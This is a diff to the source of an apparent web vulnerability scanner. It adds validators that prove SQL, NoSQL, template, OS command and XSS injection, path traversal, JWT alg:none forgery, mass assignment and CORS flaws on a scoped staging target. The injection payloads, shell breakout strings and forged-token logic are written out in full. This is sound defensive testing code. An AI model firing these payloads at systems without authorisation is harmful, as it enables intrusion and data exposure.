@@ -21,6 +21,15 @@ import { scanBaas, readOneRow, type SupabasePair } from "../checks/baas-exposure
 import { sameIdentity } from "../checks/authz-matrix.js";
 import { isPlaceholder, PATTERNS } from "../checks/exposed-secrets.js";
 import { checkLiveness, verifierHost } from "../checks/key-liveness.js";
+import { xssOracle, sqliOracle, templateOracle, nosqlOracle, nonce } from "./inject.js";
+import { startCallback, ssrfOracle } from "./ssrf.js";
+import { proveDomXss, domXssPayload } from "./domxss.js";
+import { traversalPayloads, lfiOracle } from "./lfi.js";
+import { forgeNoneToken, jwtNoneOracle, forgeNoneVariants, forgeHs256, jwkToPems, WEAK_SECRETS, jwtForgeOracle, corruptSig, headerOf, isRsaAlg, isHmacAlg } from "./jwt.js";
+import { massAssignOracle, buildBody } from "./massassign.js";
+import { corsOracle } from "./cors.js";
+import { reuseOracle } from "./reuse.js";
+import { graphqlSuggestionsOracle, graphqlBatchOracle, SUGGESTION_PROBES } from "./graphql.js";
 import type { Severity } from "../core/types.js";
 
 export type ClaimClass = "authz.cross-tenant" | "baas.supabase-rls" | "header.missing" | "check.replay" | (string & {});
@@ -530,11 +539,20 @@ const exploreCrossActorValidator: Validator = {
       control: `GET ${ctl} -> HTTP ${controlRes.status}; owner (${owner.toUpperCase()}) -> HTTP ${ownerRes.status}, sha256 ${sha(ownerRes.body).slice(0, 12)}`,
     };
     if (o.verdict !== "leak") return no(o.reason, o.verdict === "lead" ? evidence : undefined);
-    // Content everyone gets is public, not a cross-tenant read: an anonymous read of the same object rules it out.
+    // Content everyone gets is public, not a cross-tenant read: an anonymous read of the same object rules it out —
+    // UNLESS that anonymous read carries the owner's own marker, which makes it a broken-authentication leak (worse
+    // than cross-tenant). A generic catalog served identically to everyone has no per-owner marker, so it stays public.
     if (attacker !== "anon") {
       const anonRes = await sendAs(req, "anon", env, url);
       evidence.control += `; anonymous -> HTTP ${anonRes.status}`;
       if (ok2xx(anonRes.status) && authzOracle({ attacker: anonRes, owner: ownerRes, control: controlRes, ownerMarkers: markers }).verdict === "leak") {
+        if (marker && anonRes.body.includes(marker)) {
+          const again = await sendAs(req, "anon", env, url);
+          if (ok2xx(again.status) && again.body.includes(marker)) {
+            const ev2: Evidence = { request: reqLine("GET", url, "anon"), response: `HTTP ${anonRes.status}\n${excerpt(anonRes.body)}`, sha256: sha(anonRes.body), control: `GET ${ctl} -> HTTP ${controlRes.status}; the anonymous body carries ${owner.toUpperCase()}'s marker` };
+            return { claimId: claim.id, state: "proven", validator: this.name, reason: `no token at all reads ${owner.toUpperCase()}'s object at ${path}: HTTP ${anonRes.status} and the body carries ${owner.toUpperCase()}'s marker (broken authentication, worse than cross-tenant)`, evidence: ev2, ceiling: "critical" };
+          }
+        }
         return no("an anonymous visitor gets the same object: public content, not a read across tenants (claim it for anon if that is the flaw)", evidence);
       }
     } else if (!marker) {
@@ -626,7 +644,563 @@ export function insideProject(root: string, rel: string): string | null {
 
 const pathOnly = (url: string) => { try { const u = new URL(url); return u.pathname + u.search; } catch { return url; } };
 
-export const GENERIC_VALIDATORS: Validator[] = [exploreReplayValidator, exploreCrossActorValidator, exploreSecretValidator, exploreFileValidator];
+/* ---------------- explore.injection ---------------- */
+// Proves an injection by a differential, a reflection or a computation the server
+// performed — never by a signature. The exploration model submits a candidate
+// point { url, param, where?: "query"|"body", method?, value? }; this validator
+// generates its OWN payloads from a fresh nonce and the oracles in inject.ts
+// decide. A static page that ignores the param can never be proven (the SQLi
+// oracle needs a clean TRUE/FALSE differential). See inject.test.ts.
+
+/** Put `value` into `param` of a request, in the query string or the form body. Pure, tested. */
+export function injectParam(base: ExploreRequest, param: string, value: string, where: "query" | "body"): ExploreRequest {
+  if (where === "body") {
+    const body = new URLSearchParams(base.body ?? "");
+    body.set(param, value);
+    return { ...base, method: base.method ?? "POST", body: body.toString(), headers: { "content-type": "application/x-www-form-urlencoded", ...(base.headers ?? {}) } };
+  }
+  // query: rebuild on top of the url's existing search
+  const u = new URL(base.url, "http://x");
+  u.searchParams.set(param, value);
+  const rel = base.url.startsWith("http") ? u.toString() : u.pathname + u.search;
+  return { ...base, url: rel, method: base.method ?? "GET" };
+}
+
+/** GraphQL injection: the model gives a query with the literal marker __INJECT__
+ * inside a string argument; the validator substitutes each payload (escaped for a
+ * GraphQL double-quoted string) and sends it as a POST JSON body. Generic: the
+ * same oracles decide on the response. */
+export function injectGraphql(url: string, gqlTemplate: string, value: string): ExploreRequest {
+  const escaped = value.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
+  const query = gqlTemplate.includes("__INJECT__") ? gqlTemplate.replace(/__INJECT__/g, escaped) : gqlTemplate;
+  return { url, method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ query }) };
+}
+
+const exploreInjectionValidator: Validator = {
+  class: "explore.injection",
+  name: "injection (generic oracle: differential, reflection, computation)",
+  async validate(claim, env) {
+    const d = claim.detail as { url?: unknown; param?: unknown; where?: unknown; method?: unknown; value?: unknown; as?: unknown; gql?: unknown; bodyTemplate?: unknown };
+    const no = (reason: string, ev?: Evidence): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason, evidence: ev });
+    const gql = typeof d.gql === "string" && d.gql.includes("__INJECT__") ? d.gql : null;
+    if (typeof d.url !== "string") return no("need detail.url");
+    if (!gql && typeof d.param !== "string") return no("need detail.param (REST) or detail.gql with __INJECT__ (GraphQL)");
+    const url0 = resolveExploreUrl(d.url, env.stagingUrl);
+    if (!url0) return no("not an http(s) URL");
+    const where: "query" | "body" = d.where === "body" ? "body" : "query";
+    const baseVal = typeof d.value === "string" && d.value ? d.value : "1";
+    const pname = typeof d.param === "string" ? d.param : "gql-arg";
+    const actor = parseActor(d.as);
+    const base: ExploreRequest = { url: d.url, method: typeof d.method === "string" ? d.method : (where === "body" ? "POST" : "GET"), as: actor };
+    const fetchWith = async (value: string) => {
+      const req = gql ? { ...injectGraphql(d.url as string, gql, value), as: actor } : injectParam(base, d.param as string, value, where);
+      const res = await sendAs(req, actor, env, resolveExploreUrl(req.url, env.stagingUrl) ?? url0);
+      return { status: res.status, body: res.body, contentType: res.headers.get("content-type") ?? "" };
+    };
+    const ev = (what: string): Evidence => ({ request: `${(base.method ?? "GET")} ${pathOnly(url0)} (${pname}=…)`, response: what });
+    const leads: string[] = [];
+
+    // 1. SQL injection — boolean/error differential (strongest, hardest to fake).
+    // Try standard breakout contexts (string with different closers, and numeric):
+    // generic SQLi technique, not a signature for any target. First clean proof wins.
+    try {
+      const baseline = await fetchWith(baseVal);
+      const contexts: Array<{ t: string; f: string }> = [
+        { t: `${baseVal}' OR '1'='1`, f: `${baseVal}' AND '1'='2` },           // string, single quote
+        { t: `${baseVal}' OR 1=1-- `, f: `${baseVal}' AND 1=2-- ` },           // string, commented tail
+        { t: `${baseVal}') OR ('1'='1`, f: `${baseVal}') AND ('1'='2` },       // one paren
+        { t: `${baseVal}')) OR (('1'='1`, f: `${baseVal}')) AND (('1'='2` },   // two parens
+        { t: `${baseVal}" OR "1"="1`, f: `${baseVal}" AND "1"="2` },           // double quote
+        { t: `${baseVal} OR 1=1`, f: `${baseVal} AND 1=2` },                   // numeric, no quote
+      ];
+      let decided = false;
+      for (const c of contexts) {
+        const truthy = await fetchWith(c.t);
+        const falsy = await fetchWith(c.f);
+        const r = sqliOracle({ baseline, truthy, falsy });
+        if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `SQL injection in ${pname} at ${pathOnly(url0)}: ${r.reason}`, evidence: ev(r.reason), ceiling: "high" };
+        if (r.verdict === "lead" && !decided) { leads.push(r.reason); decided = true; }
+      }
+    } catch (e) { leads.push(`sqli probe failed: ${(e as Error).message}`); }
+
+    // 2. Reflected XSS — unescaped markup.
+    try {
+      const t = nonce(pname);
+      const res = await fetchWith(`<svg/onload=1>${t}`);
+      const r = xssOracle({ token: t, body: res.body, status: res.status });
+      // Only an HTML/XML context executes markup: reflected markup inside a JSON or
+      // plain-text response is not XSS. Unknown/empty content-type stays trusted.
+      const htmlCtx = !res.contentType || /html|xhtml|\bxml\b|xml;/i.test(res.contentType);
+      if (r.verdict === "proven" && htmlCtx) return { claimId: claim.id, state: "proven", validator: this.name, reason: `Reflected XSS in ${pname} at ${pathOnly(url0)}: ${r.reason}`, evidence: ev(r.reason), ceiling: "medium" };
+      if (r.verdict === "proven") leads.push(`markup reflected unescaped but served as ${res.contentType.split(";")[0]} (not an HTML context): review by hand`);
+      else if (r.verdict === "lead") leads.push(r.reason);
+    } catch (e) { leads.push(`xss probe failed: ${(e as Error).message}`); }
+
+    // 3. Template / expression injection — a computation the server performed.
+    for (const form of ["${N}", "{{N}}", "#{N}", "<%= N %>"]) {
+      try {
+        const t = nonce(pname + form);
+        const res = await fetchWith(`${t}${form.replace("N", "7*7")}`);
+        const r = templateOracle({ token: t, product: "49", body: res.body });
+        if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `Template/expression injection in ${pname} at ${pathOnly(url0)} (${form}): ${r.reason}`, evidence: ev(r.reason), ceiling: "high" };
+        if (r.verdict === "lead") leads.push(`${form}: ${r.reason}`);
+      } catch (e) { leads.push(`template probe failed: ${(e as Error).message}`); }
+    }
+
+    // 4. OS command injection — the shell computed an arithmetic tied to the nonce.
+    // Generic shell break-outs (not a signature); $((7*7)) is evaluated to 49 only
+    // if the value reaches a shell. The template oracle proves nonce+"49" adjacency.
+    for (const form of [`; echo T$((7*7))`, `| echo T$((7*7))`, `$(echo T$((7*7)))`, `\`echo T$((7*7))\``, `&& echo T$((7*7))`]) {
+      try {
+        const t = nonce(pname + form);
+        const res = await fetchWith(`${baseVal}${form.replace("T", t)}`);
+        const r = templateOracle({ token: t, product: "49", body: res.body });
+        if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `OS command injection in ${pname} at ${pathOnly(url0)} (${form.trim()}): the shell evaluated the expression`, evidence: ev(r.reason), ceiling: "critical" };
+        if (r.verdict === "lead") leads.push(`cmd ${form.trim()}: ${r.reason}`);
+      } catch (e) { leads.push(`command probe failed: ${(e as Error).message}`); }
+    }
+
+    // 5. NoSQL injection — operator injection ($ne always-true vs $eq always-false),
+    // through bracket query keys (param[$ne]=…) and through a JSON body. Generic
+    // document-store technique; the boolean differential or a parse error decides.
+    if (gql === null) {
+      const imp = `crenel-${nonce(pname)}`;
+      const qOp = async (op: string) => { const req = injectParam(base, `${d.param as string}[${op}]`, imp, "query"); const res = await sendAs({ ...req, as: actor }, actor, env, resolveExploreUrl(req.url, env.stagingUrl) ?? url0); return { status: res.status, body: res.body }; };
+      try {
+        const r = nosqlOracle({ baseline: await fetchWith(baseVal), truthy: await qOp("$ne"), falsy: await qOp("$eq") });
+        if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `NoSQL injection in ${pname} at ${pathOnly(url0)} (query operators): ${r.reason}`, evidence: ev(r.reason), ceiling: "high" };
+        if (r.verdict === "lead") leads.push(`nosql query: ${r.reason}`);
+      } catch (e) { leads.push(`nosql query probe failed: ${(e as Error).message}`); }
+      try {
+        const jbody = (v: unknown) => JSON.stringify({ [d.param as string]: v });
+        const jSend = async (v: unknown) => { const res = await sendAs({ url: d.url as string, method: typeof d.method === "string" ? d.method : "POST", headers: { "content-type": "application/json" }, body: jbody(v), as: actor }, actor, env, url0); return { status: res.status, body: res.body }; };
+        const r = nosqlOracle({ baseline: await jSend(baseVal), truthy: await jSend({ $ne: imp }), falsy: await jSend({ $eq: imp }) });
+        if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `NoSQL injection in ${pname} at ${pathOnly(url0)} (JSON body operators): ${r.reason}`, evidence: ev(r.reason), ceiling: "high" };
+        if (r.verdict === "lead") leads.push(`nosql body: ${r.reason}`);
+      } catch (e) { leads.push(`nosql body probe failed: ${(e as Error).message}`); }
+      // Multi-field JSON (e.g. a login {user, pass:"__INJECT__"}): the model gives a
+      // full body with the quoted marker "__INJECT__" at the injectable field; the
+      // validator substitutes an operator object there. Keeps the other fields intact.
+      if (typeof d.bodyTemplate === "string" && d.bodyTemplate.includes('"__INJECT__"')) {
+        try {
+          const tpl = d.bodyTemplate;
+          const sub = (v: unknown) => tpl.replace('"__INJECT__"', JSON.stringify(v));
+          const jtSend = async (v: unknown) => { const res = await sendAs({ url: d.url as string, method: typeof d.method === "string" ? d.method : "POST", headers: { "content-type": "application/json" }, body: sub(v), as: actor }, actor, env, url0); return { status: res.status, body: res.body }; };
+          const r = nosqlOracle({ baseline: await jtSend(baseVal), truthy: await jtSend({ $ne: imp }), falsy: await jtSend({ $eq: imp }) });
+          if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `NoSQL injection in ${pname} at ${pathOnly(url0)} (JSON body template): ${r.reason}`, evidence: ev(r.reason), ceiling: "high" };
+          if (r.verdict === "lead") leads.push(`nosql template: ${r.reason}`);
+        } catch (e) { leads.push(`nosql template probe failed: ${(e as Error).message}`); }
+      }
+    }
+
+    return no(leads.length ? `not proven; leads: ${leads.slice(0, 3).join("; ")}` : "no injection proven (no differential, reflection or computation)", ev(leads.slice(0, 2).join(" | ")));
+  },
+};
+
+/* ---------------- explore.ssrf ---------------- */
+// Proves SSRF out-of-band: the model points at a candidate parameter (REST or
+// GraphQL) that it thinks the server fetches; this validator stands up a listener
+// and injects a callback URL with a nonce. A hit proves the server made the
+// request. The callback host must be reachable from the target (config/detail).
+const exploreSsrfValidator: Validator = {
+  class: "explore.ssrf",
+  name: "ssrf (out-of-band callback)",
+  async validate(claim, env) {
+    const d = claim.detail as { url?: unknown; param?: unknown; where?: unknown; method?: unknown; gql?: unknown; as?: unknown; callbackHost?: unknown };
+    const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
+    const gql = typeof d.gql === "string" && d.gql.includes("__INJECT__") ? d.gql : null;
+    if (typeof d.url !== "string") return no("need detail.url");
+    if (!gql && typeof d.param !== "string") return no("need detail.param (REST) or detail.gql with __INJECT__ (GraphQL)");
+    const url0 = resolveExploreUrl(d.url, env.stagingUrl);
+    if (!url0) return no("not an http(s) URL");
+    const opts = (env.options.explore as { ssrfCallbackHost?: string; ssrfCallbackPort?: number } | undefined) ?? {};
+    // The callback host is operator config only: never let a claim point the target
+    // at an arbitrary third-party host (that would turn Crenel into an SSRF relay).
+    const host = opts.ssrfCallbackHost || "127.0.0.1";
+    const actor = parseActor(d.as);
+    const where: "query" | "body" = d.where === "body" ? "body" : "query";
+    const cb = await startCallback(host, typeof opts.ssrfCallbackPort === "number" ? opts.ssrfCallbackPort : 0);
+    try {
+      const n = nonce(String(d.param ?? "gql"));
+      // Single URL parameter: inject the whole callback URL (validator composes it).
+      // Structured/GraphQL (host/port/path split): the model built the callback from
+      // the advertised host:port and left __INJECT__ as the nonce slot, so inject the nonce.
+      const payload = gql ? n : cb.url(n);
+      const base: ExploreRequest = { url: d.url, method: typeof d.method === "string" ? d.method : (where === "body" ? "POST" : "GET"), as: actor };
+      const req = gql ? { ...injectGraphql(d.url, gql, payload), as: actor } : injectParam(base, d.param as string, payload, where);
+      // The server often BLOCKS on the outbound SSRF request, so sendAs may time
+      // out or error — the callback can still have fired. Fire-and-forget, then
+      // poll the listener regardless of the request's own outcome.
+      sendAs(req, actor, env, resolveExploreUrl(req.url, env.stagingUrl) ?? url0).catch(() => {});
+      // give the server time to make the outbound call (longer than one HTTP timeout)
+      for (let i = 0; i < 60 && !cb.hits().includes(n); i++) await new Promise((r) => setTimeout(r, 250));
+      const r = ssrfOracle({ nonce: n, hits: cb.hits() });
+      if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `SSRF in ${String(d.param ?? "gql")} at ${pathOnly(url0)}: ${r.reason}`, evidence: { request: `${base.method} ${pathOnly(url0)} (callback ${payload})`, response: "out-of-band hit received" }, ceiling: "high" };
+      return no(`${r.reason} (callback host ${host}:${cb.port}; set options.explore.ssrfCallbackHost to an address the target can reach)`);
+    } finally {
+      await cb.close();
+    }
+  },
+};
+
+/* ---------------- explore.stored-xss ---------------- */
+// Stored XSS lives across two requests: one STORES attacker markup, another SERVES
+// it. The model gives both; the validator injects a nonce-tagged <svg> into the
+// store request, then reads the retrieve request and applies the reflected-XSS
+// oracle to that body. Generic (no target signature); proven only if the markup
+// comes back UNescaped in the served page.
+const exploreStoredXssValidator: Validator = {
+  class: "explore.stored-xss",
+  name: "stored XSS (store then serve, unescaped markup)",
+  async validate(claim, env) {
+    const d = claim.detail as { storeUrl?: unknown; storeParam?: unknown; storeWhere?: unknown; storeGql?: unknown; storeMethod?: unknown; retrieveUrl?: unknown; retrieveGql?: unknown; as?: unknown };
+    const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
+    const storeGql = typeof d.storeGql === "string" && d.storeGql.includes("__INJECT__") ? d.storeGql : null;
+    if (typeof d.storeUrl !== "string") return no("need detail.storeUrl");
+    if (!storeGql && typeof d.storeParam !== "string") return no("need detail.storeParam (REST) or detail.storeGql with __INJECT__ (GraphQL)");
+    if (typeof d.retrieveUrl !== "string") return no("need detail.retrieveUrl (where the stored value is served)");
+    const sUrl = resolveExploreUrl(d.storeUrl, env.stagingUrl), rUrl = resolveExploreUrl(d.retrieveUrl, env.stagingUrl);
+    if (!sUrl || !rUrl) return no("not http(s) URLs");
+    const actor = parseActor(d.as);
+    const where: "query" | "body" = d.storeWhere === "query" ? "query" : "body";
+    const t = nonce(String(d.storeParam ?? "stored"));
+    const payload = `<svg/onload=1>${t}`;
+    const sBase: ExploreRequest = { url: d.storeUrl, method: typeof d.storeMethod === "string" ? d.storeMethod : (storeGql ? "POST" : "POST"), as: actor };
+    const sReq = storeGql ? { ...injectGraphql(d.storeUrl, storeGql, payload), as: actor } : injectParam(sBase, d.storeParam as string, payload, where);
+    try { await sendAs(sReq, actor, env, resolveExploreUrl(sReq.url, env.stagingUrl) ?? sUrl); } catch (e) { return no(`store request failed: ${(e as Error).message}`); }
+    let body: string;
+    try {
+      const rReq: ExploreRequest = typeof d.retrieveGql === "string"
+        ? { url: d.retrieveUrl, method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ query: d.retrieveGql }), as: actor }
+        : { url: d.retrieveUrl, method: "GET", as: actor };
+      const res = await sendAs(rReq, actor, env, rUrl);
+      body = res.body;
+    } catch (e) { return no(`retrieve request failed: ${(e as Error).message}`); }
+    const r = xssOracle({ token: t, body, status: 200 });
+    if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `Stored XSS: markup stored via ${pathOnly(sUrl)} is served unescaped at ${pathOnly(rUrl)}`, evidence: { request: `store ${pathOnly(sUrl)} → serve ${pathOnly(rUrl)}`, response: r.reason }, ceiling: "high" };
+    return no(r.verdict === "lead" ? `${r.reason} (stored but check escaping/context)` : "the stored marker is not served unescaped");
+  },
+};
+
+/* ---------------- explore.dom-xss ---------------- */
+// Proves DOM XSS by running the page in a real headless browser: the payload
+// calls alert(nonce); if that dialog fires, the injected script executed. The
+// browser is optional (Playwright imported dynamically) — absent, it stays a lead.
+const exploreDomXssValidator: Validator = {
+  class: "explore.dom-xss",
+  name: "DOM XSS (real browser, script execution)",
+  async validate(claim, env) {
+    const d = claim.detail as { url?: unknown; param?: unknown; where?: unknown; as?: unknown };
+    const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
+    // Either a plain {url, param} (payload goes in the query), or a url template
+    // with __INJECT__ marking where the payload goes — needed for SPA hash routes
+    // (e.g. http://app/#/search?q=__INJECT__) which carry the sink in the fragment.
+    const tmpl = typeof d.url === "string" && d.url.includes("__INJECT__");
+    if (typeof d.url !== "string") return no("need detail.url");
+    if (!tmpl && typeof d.param !== "string") return no("need detail.param, or put __INJECT__ in detail.url (SPA hash/path)");
+    const url0 = resolveExploreUrl(tmpl ? d.url.replace(/__INJECT__/g, "x") : d.url, env.stagingUrl);
+    if (!url0) return no("not an http(s) URL");
+    if (!env.scope.isHostAllowed(url0)) return no("off-scope host");
+    const where: "query" | "body" = d.where === "body" ? "body" : "query";
+    if (!tmpl && where === "body") return no("DOM XSS proof loads a URL in a browser: use a query parameter or a __INJECT__ url");
+    const t = nonce(String(d.param ?? "dom"));
+    let full: string;
+    if (tmpl) {
+      const payloadEnc = encodeURIComponent(domXssPayload(t));
+      full = resolveExploreUrl(d.url.replace(/__INJECT__/g, payloadEnc), env.stagingUrl) ?? url0;
+    } else if (d.url.includes("#")) {
+      // SPA hash route: the param lives in the fragment (…/#/search?q=…), not the
+      // main query. Inject there so the client router reads it.
+      const [head, ...fragParts] = d.url.split("#");
+      const frag = fragParts.join("#");
+      const [fpath, fquery = ""] = frag.split("?");
+      const fp = new URLSearchParams(fquery);
+      fp.set(d.param as string, domXssPayload(t));
+      full = resolveExploreUrl(`${head}#${fpath}?${fp.toString()}`, env.stagingUrl) ?? url0;
+    } else {
+      const base: ExploreRequest = { url: d.url, method: "GET", as: parseActor(d.as) };
+      const req = injectParam(base, d.param as string, domXssPayload(t), where);
+      full = resolveExploreUrl(req.url, env.stagingUrl) ?? url0;
+    }
+    const opts = (env.options.explore as { domXssBrowser?: string; domXssPlaywright?: string } | undefined) ?? {};
+    const r = await proveDomXss(full, t, { executablePath: opts.domXssBrowser, playwrightPath: opts.domXssPlaywright, allowHost: (u) => env.scope.isHostAllowed(u) });
+    if (!r.available) return no(r.reason);
+    if (r.executed) return { claimId: claim.id, state: "proven", validator: this.name, reason: `DOM XSS in ${d.param ?? "url"} at ${tmpl ? (d.url as string).slice(0, 80) : pathOnly(url0)}: ${r.reason}`, evidence: { request: `GET ${pathOnly(full)} (browser-executed)`, response: r.reason }, ceiling: "high" };
+    return no(r.reason);
+  },
+};
+
+/* ---------------- explore.lfi ---------------- */
+// Path traversal / LFI: the model points at a parameter it thinks names a file;
+// the validator makes it read a well-known system file through standard traversal
+// encodings and proves it by that file's own content. Generic, no target signature.
+const exploreLfiValidator: Validator = {
+  class: "explore.lfi",
+  name: "path traversal / LFI (system-file content)",
+  async validate(claim, env) {
+    const d = claim.detail as { url?: unknown; param?: unknown; where?: unknown; method?: unknown; as?: unknown };
+    const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
+    if (typeof d.url !== "string" || typeof d.param !== "string") return no("need detail.url and detail.param (the file parameter)");
+    const url0 = resolveExploreUrl(d.url, env.stagingUrl);
+    if (!url0) return no("not an http(s) URL");
+    const actor = parseActor(d.as);
+    const where: "query" | "body" = d.where === "body" ? "body" : "query";
+    const base: ExploreRequest = { url: d.url, method: typeof d.method === "string" ? d.method : (where === "body" ? "POST" : "GET"), as: actor };
+    const leads: string[] = [];
+    for (const { payload, marker, what } of traversalPayloads()) {
+      try {
+        const req = injectParam(base, d.param as string, payload, where);
+        const res = await sendAs(req, actor, env, resolveExploreUrl(req.url, env.stagingUrl) ?? url0);
+        const r = lfiOracle({ body: res.body, marker });
+        if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `Path traversal in ${d.param} at ${pathOnly(url0)}: served ${what}`, evidence: { request: `${base.method} ${pathOnly(url0)} (${d.param}=${payload.slice(0, 40)})`, response: r.reason }, ceiling: "high" };
+      } catch (e) { leads.push((e as Error).message); }
+    }
+    return no(leads.length ? `not proven; some probes failed: ${leads.slice(0, 2).join("; ")}` : "no system-file content returned by any traversal payload");
+  },
+};
+
+/* ---------------- explore.jwt-none ---------------- */
+// Broken JWT verification: the server accepts an unsigned alg:none token. The
+// model supplies a real token; the validator re-encodes it unsigned (optionally
+// escalating a claim) and proves it by a differential — forged accepted where
+// anonymous is denied. No secret, no target signature.
+const exploreJwtNoneValidator: Validator = {
+  class: "explore.jwt-none",
+  name: "JWT alg:none accepted (broken verification)",
+  async validate(claim, env) {
+    const d = claim.detail as { url?: unknown; token?: unknown; override?: unknown; as?: unknown };
+    const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
+    if (typeof d.url !== "string") return no("need detail.url");
+    const token = typeof d.token === "string" ? d.token : actorToken(env.options, parseActor(d.as) ?? "a");
+    if (!token) return no("no JWT available: set detail.as to a configured account (or detail.token)");
+    const url = resolveExploreUrl(d.url, env.stagingUrl);
+    if (!url) return no("not an http(s) URL");
+    if (!env.scope.isHostAllowed(url)) return no("off-scope host");
+    const forged = forgeNoneToken(token, d.override && typeof d.override === "object" ? d.override as Record<string, unknown> : undefined);
+    if (!forged) return no("the token is not a decodable JWT");
+    const read = async (headers: Record<string, string>) => { const r = await safeFetch(url, env.scope, { method: "GET", headers, maxBytes: 512 * 1024 }); return { status: r.status, body: r.body }; };
+    const forgedRes = await read({ authorization: `Bearer ${forged}` });
+    const anonRes = await read({});
+    const r = jwtNoneOracle({ forged: forgedRes, anon: anonRes });
+    if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `JWT verification broken at ${pathOnly(url)}: ${r.reason}`, evidence: { request: `GET ${pathOnly(url)} with a forged alg:none token`, response: r.reason }, ceiling: "critical" };
+    return no(r.reason);
+  },
+};
+
+/* ---------------- explore.mass-assignment ---------------- */
+// OWASP API6. The model names an update endpoint, a field the client should not
+// control (role, isAdmin, credits, plan, verified…) and a value. This validator
+// proves the mechanism with a differential and a control, never a field-name
+// signature: read the actor's own object (baseline), update WITHOUT the field
+// (control: it must stay the same), update WITH field=value (the re-read must
+// show exactly that value). Whether the field is privileged is the model's
+// reading; what is proven is that the API accepted and persisted a body field.
+// Mutating, on the actor's own object, so it needs active mode. See massassign.test.ts.
+const exploreMassAssignValidator: Validator = {
+  class: "explore.mass-assignment",
+  name: "mass-assignment (body field accepted and persisted)",
+  async validate(claim, env) {
+    const d = claim.detail as { url?: unknown; field?: unknown; value?: unknown; update?: unknown; readUrl?: unknown; method?: unknown; bodyType?: unknown; as?: unknown };
+    const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
+    if (!env.scope.allowActiveTesting) return no("mass-assignment mutates the object: needs allowActiveTesting");
+    if (typeof d.url !== "string") return no("need detail.url (the update endpoint)");
+    if (typeof d.field !== "string" || !d.field) return no("need detail.field (the field the client should not control)");
+    if (d.value === undefined) return no("need detail.value (the value to inject)");
+    const upUrl = resolveExploreUrl(d.url, env.stagingUrl);
+    const readUrl = resolveExploreUrl(typeof d.readUrl === "string" ? d.readUrl : d.url, env.stagingUrl);
+    if (!upUrl || !readUrl) return no("not http(s) URLs");
+    if (!env.scope.isHostAllowed(upUrl) || !env.scope.isHostAllowed(readUrl)) return no("off-scope host");
+    const actor = parseActor(d.as);
+    const method = typeof d.method === "string" ? d.method : "PUT";
+    const bodyType: "json" | "form" = d.bodyType === "form" ? "form" : "json";
+    const base = d.update && typeof d.update === "object" && !Array.isArray(d.update) ? (d.update as Record<string, unknown>) : {};
+    const readBack = async () => { const r = await sendAs({ url: d.url as string, method: "GET", as: actor }, actor, env, readUrl); return { status: r.status, body: r.body }; };
+    const writeThen = async (extra: Record<string, unknown> | null) => {
+      const { body, contentType } = buildBody(base, extra, bodyType);
+      await sendAs({ url: d.url as string, method, headers: { "content-type": contentType }, body, as: actor }, actor, env, upUrl);
+    };
+    let baseline, control, injectedRead;
+    try {
+      baseline = await readBack();
+      await writeThen(null);
+      control = await readBack();
+      await writeThen({ [d.field]: d.value });
+      injectedRead = await readBack();
+    } catch (e) { return no(`request failed: ${(e as Error).message}`); }
+    const r = massAssignOracle({ field: d.field, injected: d.value, baseline, control, injectedRead });
+    if (r.verdict === "set") return { claimId: claim.id, state: "proven", validator: this.name, reason: `Mass-assignment at ${pathOnly(upUrl)}: ${r.reason} (whether "${d.field}" should be client-settable is the model's reading)`, evidence: { request: `${method} ${pathOnly(upUrl)} with {"${d.field}": ${JSON.stringify(d.value)}}, verified by GET ${pathOnly(readUrl)} as ${actor ? actor.toUpperCase() : "anon"}`, response: r.reason }, ceiling: "medium" };
+    return no(r.reason);
+  },
+};
+
+/* ---------------- explore.cors ---------------- */
+// Reflects an arbitrary Origin with credentials. The validator sends its OWN two
+// distinct attacker origins and the oracle decides; a read-only GET, no active
+// mode. Generic: no target signature, a wildcard is only a lead. See cors.test.ts.
+const exploreCorsValidator: Validator = {
+  class: "explore.cors",
+  name: "CORS reflects any origin with credentials",
+  async validate(claim, env) {
+    const d = claim.detail as { url?: unknown };
+    const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
+    if (typeof d.url !== "string") return no("need detail.url");
+    const url = resolveExploreUrl(d.url, env.stagingUrl);
+    if (!url) return no("not an http(s) URL");
+    if (!env.scope.isHostAllowed(url)) return no("off-scope host");
+    const o1 = `https://crenel-evil-${nonce("o")}.example`, o2 = `https://crenel-attacker-${nonce("o")}.test`;
+    const probe = async (origin: string) => {
+      const r = await safeFetch(url, env.scope, { method: "GET", headers: { origin }, maxBytes: 64 * 1024 });
+      return { acao: r.headers.get("access-control-allow-origin"), acac: r.headers.get("access-control-allow-credentials") };
+    };
+    let r1, r2;
+    try { r1 = await probe(o1); r2 = await probe(o2); } catch (e) { return no(`request failed: ${(e as Error).message}`); }
+    const v = corsOracle({ o1, r1, o2, r2 });
+    if (v.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `CORS misconfiguration at ${pathOnly(url)}: ${v.reason}`, evidence: { request: `GET ${pathOnly(url)} with Origin: ${o1} (and ${o2})`, response: v.reason }, ceiling: v.ceiling };
+    return no(v.reason);
+  },
+};
+
+/* ---------------- explore.reuse ---------------- */
+// Business logic: a single-use artifact (coupon, credit, invite) applied more
+// than once. The validator replays the SAME application twice and an invalid one
